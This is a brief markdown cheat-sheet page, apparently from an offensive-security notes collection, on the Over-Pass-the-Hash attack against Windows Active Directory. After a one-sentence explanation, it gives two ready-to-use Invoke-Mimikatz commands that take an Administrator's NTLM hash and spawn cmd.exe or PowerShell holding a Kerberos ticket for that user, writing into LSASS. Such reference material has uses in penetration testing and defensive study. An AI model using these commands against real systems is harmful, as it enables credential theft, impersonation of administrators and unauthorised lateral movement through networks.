---
description: Over Pass The Hash
---

# Over Pass The Hash

> OPTH creates a valid kerberos ticket using the NTLM hash of the user. We can run executables which will hold the ticket for that user. This involes writing into LSASS.

```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:$DOMAIN /ntlm:$NTLMHASH"' #Runs cmd.exe by default

Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:$DOMAIN /ntlm:$NTLMHASH /run:powershell.exe"' #Run powershell.exe
```
